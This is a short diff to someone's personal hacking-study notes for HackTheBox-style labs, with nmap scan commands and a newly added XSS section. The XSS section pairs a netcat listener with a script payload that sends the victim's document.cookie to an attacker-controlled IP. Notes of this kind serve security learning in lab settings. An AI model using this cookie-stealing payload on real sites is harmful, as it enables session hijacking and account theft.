@@ -6,6 +6,10 @@ Random notes I've made while learning about hacking that might prove useful in t
 - `echo "10.10.10.206 passage.htb" | sudo tee -a /etc/hosts; ping passage.htb`
 - `nmap -p- -sC -sV --min-rate 1000 passage.htb | tee nmap`
 
+## XSS
+- op eigen systeem: `nc -lvnp 80`
+- op target webpage: `<script>document.write('<img src="http://<your ip>/?cookies=' + document.cookie + '" />')</script>`
+
 ## Nmap
 - `nmap -sC -sV nmap 10.10.10.14 > nmap_scan`
 - vulnerability scan: `nmap -sV -sC --script vuln 10.10.4.35`
